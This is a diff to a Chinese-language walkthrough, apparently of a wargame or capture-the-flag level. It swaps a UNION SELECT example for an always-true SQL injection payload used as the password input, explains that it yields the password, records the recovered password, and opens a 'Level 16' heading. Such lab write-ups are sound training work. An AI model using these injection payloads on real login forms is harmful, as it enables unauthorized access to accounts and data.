@@ -248,6 +248,12 @@ echo $content;
 ```
 以及 `password`：
 ```sql
-456 UNION SELECT * from users
+456" or "1"="1
 ```
+即可构造恒真查询条件，得到密码。
+
+密码为 `GB6USCJYJjwLyYhZUNkE1NwDueiTow6g`
+
+## Level 16
+
 
